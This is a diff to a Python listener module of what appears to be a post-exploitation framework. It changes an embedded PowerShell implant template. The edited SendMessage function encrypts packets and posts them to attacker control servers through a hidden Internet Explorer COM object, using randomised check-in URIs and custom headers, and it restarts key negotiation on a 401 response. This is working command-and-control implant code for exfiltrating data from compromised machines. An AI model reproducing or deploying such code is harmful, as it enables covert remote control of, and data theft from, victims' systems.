@@ -625,10 +625,12 @@ class Listener:
                 """.format(ControlServers = updateServers,reqheader = listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
+                    $script:SendMessage = {{
+                        param($Packets,$FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
-                        if($Packets) {
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -638,30 +640,31 @@ class Listener:
 
                             $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
 
                                 $Headers = ""
-                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $FixedParameters["headers"].GetEnumerator()| %{{ $Headers += "`r`n$($_.Name): $($_.Value)" }}
                                 $Headers.TrimStart("`r`n")
 
-                                try {
+                                try {{
                                     # choose a random valid URI for checkin
-                                    $taskURI = $script:TaskURIs | Get-Random
-                                    $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    $ServerURI = $ControlServers[$ServerIndex] + $taskURI
 
                                     $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
-                                    while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
-                                }
-                                catch [System.Net.WebException]{
+                                    while($Script:IE.busy -eq $true){{Start-Sleep -Milliseconds 100}}
+                                }}
+                                catch [System.Net.WebException]{{
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
+                #COMM_FUNCTION
                 """
 
                 return (listener_dict,
